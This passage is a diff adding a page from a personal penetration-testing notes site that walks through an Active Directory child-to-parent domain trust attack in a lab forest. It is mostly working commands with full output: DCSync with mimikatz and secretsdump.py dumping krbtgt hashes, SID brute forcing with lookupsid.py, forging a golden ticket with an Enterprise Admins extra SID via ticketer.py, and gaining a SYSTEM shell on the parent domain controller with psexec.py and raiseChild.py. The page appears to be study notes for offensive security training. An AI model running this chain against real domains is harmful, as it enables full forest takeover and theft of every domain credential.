+    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
+    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
+    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
+</code></pre>
+<p>When dealing with multiple domains and your target domain is not the same as the user's domain, you will need to specify the exact domain to perform the DCSync operation on the particular DC. The command for this would look like the following:</p>
+<pre><code class="language-powershell">mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
+
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'INLANEFREIGHT\lab_adm' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : lab_adm
+
+** SAM ACCOUNT **
+
+SAM Username         : lab_adm
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 2/27/2022 10:53:21 PM
+Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
+Object Relative ID   : 1001
+
+Credentials:
+  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
+    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
+    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
+    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
+</code></pre>
+<h2 id="attacking-domain-trusts-from-linux"><a class="header" href="#attacking-domain-trusts-from-linux">Attacking Domain Trusts from Linux</a></h2>
+<p>You will still need to gather the same bits of information:</p>
+<ul>
+<li>The KRBTGT hash for the child domain</li>
+<li>The SID for the child domain</li>
+<li>The name of a target user in the child domain</li>
+<li>The FQDN of the child domain</li>
+<li>The SID of the Enterprise Admins group of the root domain</li>
+</ul>
+<h3 id="performing-dcsync-with-secretsdumppy"><a class="header" href="#performing-dcsync-with-secretsdumppy">Performing DCSync with secretsdump.py</a></h3>
+<p>Once you have complete control of the child domain, LOGISTICS.INLANEFREIGHT.LOCAL, you can use secretsdump.py to DCSync and grab the NTLM hash for the KRBTGT account.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
+krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
+krbtgt:des-cbc-md5:fee04c3d026d7538
+[*] Cleaning up...
+</code></pre>
+<h3 id="performing-sid-brute-forcing-using-lookupsidpy"><a class="header" href="#performing-sid-brute-forcing-using-lookupsidpy">Performing SID Brute Forcing using lookupsid.py</a></h3>
+<p>Next, you can use lookupsid.py from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. In this command, whatever you specify for the IP address will become the target domain for a SID lookup. The tool will give you back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format DOMAIN_SID-RID. For example, from the output below, you can see that the SID of the lab_adm user would be <code>S-1-5-21-2806153819-209893948-922872689-1001</code>.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
+
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Brute forcing SIDs at 172.16.5.240
+[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
+500: LOGISTICS\Administrator (SidTypeUser)
+501: LOGISTICS\Guest (SidTypeUser)
+502: LOGISTICS\krbtgt (SidTypeUser)
+512: LOGISTICS\Domain Admins (SidTypeGroup)
+513: LOGISTICS\Domain Users (SidTypeGroup)
+514: LOGISTICS\Domain Guests (SidTypeGroup)
+515: LOGISTICS\Domain Computers (SidTypeGroup)
+516: LOGISTICS\Domain Controllers (SidTypeGroup)
+517: LOGISTICS\Cert Publishers (SidTypeAlias)
+520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)
+521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)
+522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)
+525: LOGISTICS\Protected Users (SidTypeGroup)
+526: LOGISTICS\Key Admins (SidTypeGroup)
+553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)
+571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)
+572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)
+1001: LOGISTICS\lab_adm (SidTypeUser)
+1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)
+1103: LOGISTICS\DnsAdmins (SidTypeAlias)
+1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)
+1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)
+1106: LOGISTICS\htb-student_adm (SidTypeUser)
+</code></pre>
+<h3 id="looking-for-the-domain-sid"><a class="header" href="#looking-for-the-domain-sid">Looking for the Domain SID</a></h3>
+<p>You can filter out the noise by piping the command output to grep and looking for just the domain SID.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+
+Password:
+
+[*] Domain SID is: S-1-5-21-2806153819-209893948-92287268
+</code></pre>
+<h3 id="grabbing-the-domain-sid--attaching-to-enterprise-admins-rid"><a class="header" href="#grabbing-the-domain-sid--attaching-to-enterprise-admins-rid">Grabbing the Domain SID &amp; Attaching to Enterprise Admin's RID</a></h3>
+<p>Next, you can rerun the command, targeting the INLANEFREIGHT DC at 172.16.5.5 and grab the domain SID <code>S-1-5-21-3842939050-3880317879-2865463114</code> and attach the RID of the Enterprise Admins group. <a href="https://adsecurity.org/?p=1001">Here</a> is a handy list of well-known SIDs.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+
+Password:
+[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
+498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: INLANEFREIGHT\administrator (SidTypeUser)
+501: INLANEFREIGHT\guest (SidTypeUser)
+502: INLANEFREIGHT\krbtgt (SidTypeUser)
+512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
+513: INLANEFREIGHT\Domain Users (SidTypeGroup)
+514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
+515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
+516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
+517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
+518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
+519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
+</code></pre>
+<h3 id="constructing-a-golden-ticket-using-ticketerpy"><a class="header" href="#constructing-a-golden-ticket-using-ticketerpy">Constructing a Golden Ticket using ticketer.py</a></h3>
+<p>Next, you can use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py">ticketer.py</a> from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain and the parent domain.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncASRepPart
+[*] Saving ticket in hacker.ccache
+</code></pre>
+<p>The ticket will be saved down to your system as a credential cache (<em>ccache</em>) file, which is a file used to hold Kerberos credentials.</p>
+<h3 id="setting-the-krb5ccname-environment-variable"><a class="header" href="#setting-the-krb5ccname-environment-variable">Setting the KRB5CCNAME Environment Variable</a></h3>
+<p>Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ export KRB5CCNAME=hacker.ccache 
+</code></pre>
+<h3 id="getting-a-system-shell-using-impackets-psexecpy"><a class="header" href="#getting-a-system-shell-using-impackets-psexecpy">Getting a SYSTEM shell using Impacket's psexec.py</a></h3>
+<p>You can check if you can successfully authenticate to the parent domain's DC using Impacket's version of Psexec. If succesful, you will be dropped into a SYSTEM shell on the target DC.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 172.16.5.5.....
+[*] Found writable share ADMIN$
+[*] Uploading file nkYjGWDZ.exe
+[*] Opening SVCManager on 172.16.5.5.....
+[*] Creating service eTCU on 172.16.5.5.....
+[*] Starting service eTCU.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+
+C:\Windows\system32&gt; hostname
+ACADEMY-EA-DC01
+</code></pre>
+<h3 id="performing-the-attack-with-raisechildpy"><a class="header" href="#performing-the-attack-with-raisechildpy">Performing the Attack with raiseChild.py</a></h3>
+<p>Impacket also has the tool raiseChild.py, which will automate escalating from child to parent domain. You need to specify the target DC and credentials for an administrative user in the child domain; the script will do the rest. If you walk through the output, you see that it starts by listing out the child and parent domain's fully qualified domain names. It then:</p>
+<ul>
+<li>Obtains the SID for the Enterprise Admins group of the parent domain</li>
+<li>Retrieves the hash for the KRBTGT account in the child domain</li>
+<li>Creates a Golden Ticket</li>
+<li>Logs into the parent domain</li>
+<li>Retrieves credentials for the Administrator account in the parent domain</li>
+</ul>
+<h3 id="performing-the-attack-with-raisechildpy-1"><a class="header" href="#performing-the-attack-with-raisechildpy-1">Performing the Attack with raiseChild.py</a></h3>
+<p>Finally, if the <code>target-exec</code> switch is specified, it authenticates to the parent's DC via Psexec.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
+[*] Forest FQDN is: INLANEFREIGHT.LOCAL
+[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
+[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
+[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
+LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
+LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
+[*] Getting credentials for INLANEFREIGHT.LOCAL
+INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
+INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
+[*] Target User account name is administrator
+INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
+[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Found writable share ADMIN$
+[*] Uploading file BnEGssCE.exe
+[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Starting service UVNb.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+nt authority\system
+
+C:\Windows\system32&gt;exit
+[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
+[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Stopping service UVNb.....
+[*] Removing service UVNb.....
+[*] Removing file BnEGssCE.exe.....
+</code></pre>
+<p>The script lists out the workflow and process in a comment as follows:</p>
+<pre><code class="language-python">#   The workflow is as follows:
+#       Input:
+#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
+#              The domain specified MUST be the domain FQDN.
+#           2) Optionally a pathname to save the generated golden ticket (-w switch)
+#           3) Optionally a target-user RID to get credentials (-targetRID switch)
+#              Administrator by default.
+#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
+#              Enterprise Admin by default.
+#
+#       Process:
+#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
+#           2) Find out what the forest FQDN is (via [MS-NRPC])
+#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
+#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
+#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
+#              and setting expiration 10 years from now
+#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
+#           7) If file was specified, save the golden ticket in ccache format
+#           8) If target was specified, a PSEXEC shell is launched
+#
+#       Output:
+#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
+#           2) A golden ticket saved in ccache for future fun and profit
+#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
+#              parameter.
+```&lt;!-- {% embed footer message="2025 • Created by [d41y](https://github.com/d41y)" %} --&gt;
+
+&lt;div data-embedify data-app="footer" data-option-message="2025 • Created by [d41y](https://github.com/d41y)" style="display:none"&gt;&lt;/div&gt;
+
+&lt;style&gt;footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }&lt;/style&gt;&lt;footer&gt;&lt;p&gt;2025 • Created by &lt;a href="https://github.com/d41y"&gt;d41y&lt;/a&gt;&lt;/p&gt;&lt;/footer&gt;</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../attack/windows/ad/enum_and_attacks/ad_extras.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../../attack/windows/ad/enum_and_attacks/ad_cross_forest_trust_attacks.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../attack/windows/ad/enum_and_attacks/ad_extras.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../../attack/windows/ad/enum_and_attacks/ad_cross_forest_trust_attacks.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../../elasticlunr.min.js"></script>
+        <script src="../../../../mark.min.js"></script>
+        <script src="../../../../searcher.js"></script>
+
+        <script src="../../../../clipboard.min.js"></script>
+        <script src="../../../../highlight.js"></script>
+        <script src="../../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="../../../../theme/pagetoc.js"></script>
+
+
+
+    </div>
+    </body>
+</html>
